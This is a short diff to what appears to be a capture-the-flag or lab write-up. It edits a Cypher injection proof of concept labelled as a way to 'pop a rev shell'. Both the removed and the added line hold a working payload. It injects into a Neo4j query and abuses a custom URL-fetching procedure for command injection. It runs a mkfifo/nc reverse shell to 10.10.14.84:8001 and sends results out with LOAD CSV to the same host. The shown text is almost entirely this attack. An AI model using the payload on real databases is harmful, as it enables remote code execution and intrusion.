@@ -211,5 +211,5 @@ public class CustomFunctions {
 - POC to pop a rev shell-:
 
 ```neo4j
-1' OR 1=1 WITH 1337 AS x CALL custom.getUrlStatusCode('http://10.10.14.84:8002/rev.sh?id=`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.84 8001 >/tmp/f`') YIELD statusCode LOAD CSV FROM \'http://10.10.14.84:8002/zz?statuscode=\'+statusCode AS y RETURN y//
+1' OR 1=1 WITH 1337 AS x CALL custom.getUrlStatusCode('http://10.10.14.84:8002/rev.sh?id=`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.84 8001 >/tmp/f`') YIELD statusCode LOAD CSV FROM 'http://10.10.14.84:8002/zz?statuscode='+statusCode AS y RETURN y//
 ```
